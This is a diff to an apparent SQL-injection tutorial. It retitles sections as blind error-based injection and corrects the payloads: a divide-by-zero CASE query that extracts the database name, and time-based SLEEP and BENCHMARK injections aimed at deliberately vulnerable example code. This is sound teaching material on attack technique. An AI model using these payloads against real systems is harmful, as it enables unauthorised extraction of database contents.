@@ -152,9 +152,9 @@ To speed up the process we can use the 'bit-by-bit' approach that can make 8
 requests in parallel without waiting the previous request (we will explore it
   in the next lessons).
 
-## 'ERROR BASED INJECTION
+## 'BLIND ERROR BASED INJECTION
 
-Error based injections come into play when we observe that an application show
+Blind Error based injections come into play when we observe that an application show
 us a generic error message when we break the syntax of a query and we have no
 control on the output of a legal query.
 The main idea behind this approach is to alter the query in order to inject a
@@ -186,7 +186,7 @@ SELECT
 In this SQL code the first expression (`127 > 2`) will be evaluated and, if true
 the select statement will return `YES`, otherwise `NO`.
 
-### ERROR BASED EXAMPLE
+### BLIND ERROR BASED EXAMPLE
 
 Given this ruby code in a PostgreSQL environment:
 ```ruby
@@ -216,7 +216,7 @@ So we have to inject:
 ```sql
 SELECT
   CASE
-    WHEN (SUBSTRING(current_database(), 1, 2) = 'a')
+    WHEN (SUBSTRING(current_database(), 1, 1) = 'a')
     THEN (1/0)
     ELSE 1
   END
@@ -235,7 +235,7 @@ SELECT COUNT(id) FROM pages WHERE status = ''
 UNION ALL
 SELECT
   CASE
-    WHEN (SUBSTRING(current_database(), 1, 2) = 'a')
+    WHEN (SUBSTRING(current_database(), 1, 1) = 'a')
     THEN (1/0)
     ELSE 1
   END
@@ -301,7 +301,7 @@ def count_pages(status):
 ```
 N.B. This is an intended bad example. Do not interpolate strings in a SQL query.
 
-Using `status = "' UNION SELECT IF (ASCII(SUBSTRING(database(), 1, 1)) > 127, SLEEP(1), 1) -- -";` the query produced will be:
+Using `status = "' UNION SELECT IF (ASCII(SUBSTRING(database(), 1, 1)) > 127, SLEEP(1), 1) -- -"` the query produced will be:
 
 ```sql
 SELECT COUNT(id) FROM pages
@@ -318,7 +318,7 @@ ASCII (`ASCII(...)`) is greater that `127` the query will pause for 5 seconds
 
 We can do the same thing with `BENCHMARK()`:
 
-Using `status = "' UNION SELECT IF (ASCII(SUBSTRING(database(), 1, 1)) > 127, BENCHMARK(1000000, RAND()), 1) -- -";` the query produced will be:
+Using `status = "' UNION SELECT IF (ASCII(SUBSTRING(database(), 1, 1)) > 127, BENCHMARK(1000000, RAND()), 1) -- -"` the query produced will be:
 
 ```sql
 SELECT COUNT(id) FROM pages
